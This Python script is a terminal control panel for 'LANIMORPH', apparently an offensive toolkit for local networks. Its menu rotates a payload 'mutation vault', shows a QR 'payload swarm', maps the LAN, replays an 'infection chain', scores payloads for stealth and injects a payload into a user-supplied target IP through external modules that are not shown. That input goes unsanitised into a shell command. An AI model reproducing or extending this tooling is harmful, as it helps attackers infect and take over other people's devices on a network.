#!/usr/bin/env python3
import os, time, subprocess
from datetime import datetime

def get_real_ip():
    try:
        result = subprocess.check_output("ip addr", shell=True).decode()
        for line in result.splitlines():
            line = line.strip()
            if line.startswith("inet ") and not "127.0.0.1" in line:
                return line.split()[1].split('/')[0]
    except:
        return "0.0.0.0"
    return "0.0.0.0"

def get_last_injection():
    try:
        with open(os.path.expanduser("~/LANIMORPH/vault/inject_silent.log")) as f:
            return f.readlines()[-1].strip()
    except:
        return "[none]"

def get_mutation():
    try:
        with open(os.path.expanduser("~/LANIMORPH/vault/vault_drop.txt")) as f:
            return f.readline().strip()
    except:
        return "[unknown]"

def show_dashboard():
    os.system("clear")
    print("="*59)
    print("🧠  LANIMORPH :: LIVE OPERATION DASHBOARD")
    print("="*59)
    print("[-] Netlink socket access blocked — fallback mode enabled")
    print("[+] Local IP            : " + get_real_ip())
    print("[+] Current Mutation    : " + get_mutation())
    print("[+] Last Injection      : " + get_last_injection())
    print("[+] Time                : " + datetime.now().strftime("%H:%M:%S"))
    print("="*59)
    print("Choose an option:\n")
    print(" [1] Rotate mutation vault")
    print(" [2] QR payload swarm (show in terminal)")
    print(" [3] Run LAN heatmap")
    print(" [4] Open stealth flyer")
    print(" [5] Replay infection chain")
    print(" [6] Score payload stealth (AI)")
    print(" [7] Inject payload to IP")
    print(" [0] Exit\n")

def handle_choice(choice):
    if choice == "1":
        print("[~] Rotating mutation vault...") 
        os.system("python3 ~/LANIMORPH/chain/rotate_vault.py")
    elif choice == "2":
        os.system("cat ~/LANIMORPH/flyers/qrs/qr_payload_swarm.txt || echo '[!] QR swarm file not found'")
    elif choice == "3":
        os.system("python3 ~/LANIMORPH/chain/lan_heatmap.py || echo '[!] LAN heatmap module missing'")
    elif choice == "4":
        os.system("termux-open ~/LANIMORPH/flyers/stealth_flyer.html || echo '[!] Flyer not found'")
    elif choice == "5":
        os.system("bash ~/LANIMORPH/chain/replay_chain.sh || echo '[!] Replay script not found'")
    elif choice == "6":
        os.system("python3 ~/LANIMORPH/chain/score_payload.py || echo '[!] Scoring module disabled or missing'")
    elif choice == "7":
        ip = input("Enter target IP: ")
        os.system(f"python3 ~/LANIMORPH/chain/manual_inject.py {ip}")
    elif choice == "0":
        print("[*] Exiting...")
        return False
    else:
        print("[!] Invalid choice.")
    input("\n[Press Enter to return to dashboard]")
    return True

while True:
    show_dashboard()
    user_choice = input(">> ").strip()
    if not handle_choice(user_choice):
        break
